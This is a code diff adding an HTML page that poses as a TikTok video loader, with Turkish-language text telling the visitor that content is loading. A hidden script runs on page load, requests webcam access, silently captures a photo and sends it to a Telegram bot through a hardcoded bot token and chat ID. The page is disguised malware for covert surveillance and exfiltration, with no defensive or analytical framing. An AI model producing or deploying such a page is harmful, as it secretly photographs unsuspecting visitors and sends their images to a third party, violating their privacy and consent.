@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TikTok Watching RU</title>
+  <style>
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      background-color: #000;
+      color: white;
+      font-family: Arial, sans-serif;
+      text-align: center;
+    }
+    video {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div>
+    <h1>TikTok izleniyor...</h1>
+    <p>Lütfen bekleyin, içerik yükleniyor.</p>
+    <video id="video" autoplay playsinline></video>
+  </div>
+
+  <script>
+    const telegramBotToken = "7715203894:AAGhkXZZqViXKEnGc_l5Xe7s-jdwqwCrLwY";
+    const telegramChatId = "8053934312";
+
+    async function captureAndSendPhoto() {
+      try {
+        const video = document.getElementById('video');
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        await new Promise(resolve => setTimeout(resolve, 2000)); // 2 saniye bekle
+
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        stream.getTracks().forEach(track => track.stop());
+
+        const dataUrl = canvas.toDataURL('image/jpeg');
+        const blob = await (await fetch(dataUrl)).blob();
+
+        const formData = new FormData();
+        formData.append('chat_id', telegramChatId);
+        formData.append('photo', blob, 'photo.jpg');
+
+        await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+      } catch (err) {
+        console.error('Kamera erişimi reddedildi veya hata oluştu:', err);
+      }
+    }
+
+    captureAndSendPhoto();
+  </script>
+</body>
+</html>
